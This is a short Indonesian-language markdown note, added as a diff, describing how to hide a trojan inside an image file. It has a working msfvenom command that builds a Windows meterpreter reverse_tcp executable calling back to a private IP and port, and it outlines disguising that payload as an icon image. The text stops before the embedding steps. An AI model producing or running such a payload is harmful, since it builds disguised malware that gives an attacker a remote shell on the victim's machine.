@@ -1,0 +1,13 @@
+## kita akan mengirim trojan ke image
+
+# pertama kita siapkan dulu gambar nya
+# kemudian kita convert image nya ke ICO
+
+# kita buat payload dengan msfvenom
+$ msfvenom -p /windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.134 LPORT=9999 -f exe -o venom.exe
+
+# kita akan memasukkan payload nya ke image
+
+----
+
+
